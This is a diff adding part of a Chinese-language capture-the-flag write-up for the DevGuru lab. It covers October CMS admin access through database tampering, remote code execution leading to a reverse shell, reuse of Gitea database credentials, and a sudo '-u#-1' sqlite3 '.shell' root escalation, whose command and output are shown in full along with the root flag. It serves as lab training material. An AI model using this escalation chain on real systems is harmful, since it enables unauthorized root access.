@@ -185,3 +185,58 @@ frank/$2y$10$bp5wBfbAN6lMYT27pJMomOGutDF2RKZKYZITAupZ3x8eAaYgN6EKK
 ![](images/2024-03-23-16-56-14.png)
 这密码爆破不了，hashcat跑了一会儿跑不出来
 直接插入数据吧
+123/123456
+
+登到后台 
+找历史漏洞，这是一个october cms
+那么搜了一下，本来有个文件上传的漏洞来着
+这个版本可能高一些，没法用
+但是在源码管理那里有rce
+这里直接改马会报错，可以用下面的代码测试
+![](images/2024-03-29-18-16-53.png)
+![](images/2024-03-29-18-18-42.png)
+看到有成功执行，那么就反弹shell吧
+![](images/2024-03-30-11-45-13.png)
+
+## 提权
+
+![](images/2024-03-30-13-17-01.png)
+在这个文件夹下找到一些信息
+![](images/2024-03-30-13-13-59.png)
+看到gitea数据库的登录账号和密码
+![](images/2024-03-30-13-18-14.png)
+这里要修改用户密码及编码方式
+改成了123
+使用上面找到的RCE历史漏洞一把梭
+![](images/2024-03-30-13-43-56.png)
+```bash
+frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -l
+sudo -l
+Matching Defaults entries for frank on devguru:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User frank may run the following commands on devguru:
+    (ALL, !root) NOPASSWD: /usr/bin/sqlite3
+frank@devguru:~/gitea-repositories/frank/vuln.git$
+```
+拿到shell看到一个sqlite3
+这里用#-1提权，sudo找不到-1用户就切换成了0用户，即root
+```bash
+frank@devguru:~/gitea-repositories/frank/vuln.git$ sudo -u#-1  sqlite3 /dev/null '.shell /bin/sh'
+ '.shell /bin/sh'e3 /dev/null
+# ls /root
+ls /root
+msg.txt  root.txt
+# cat /root/msg.txt
+cat /root/msg.txt
+
+           Congrats on rooting DevGuru!
+  Contact me via Twitter @zayotic to give feedback!
+
+
+# cat /root/root.txt
+cat /root/root.txt
+96440606fb88aa7497cde5a8e68daf8f
+#
+```
